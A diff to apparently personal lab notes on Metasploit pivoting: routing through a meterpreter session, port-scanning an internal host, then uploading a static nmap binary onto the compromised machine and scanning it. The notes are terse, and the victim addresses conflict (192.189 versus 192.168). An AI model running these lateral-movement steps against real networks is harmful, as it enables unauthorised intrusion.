@@ -77,7 +77,7 @@ Channel 0 created.
 bash: cannot set terminal process group (433): Inappropriate ioctl for device
 bash: no job control in this shell
 target ip:192.189.244.2
-so victim ip in that range 
+so victim ip in that range victim ip is <192.168.244.3>
 so come to meterpreter
 ctrl +c & Y
 run autoroute -s <ip of that target machine>
@@ -94,6 +94,21 @@ meterpreter > background
 sessions you will get sessions
 
 sessions -i <number> you will interact with the sessions
+
+now we are scanning ports in the 244.3
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.189.244.3
+set verbose false
+set ports 1-1000
+exploit
+
+then pivot into session 1//using session -i <session_id>
+
+upload /root/static-binaries/nmap /tmp/nmap
+shell
+chmod +x ./nmap
+./nmap -p- <victim ip>
+
 
 
 
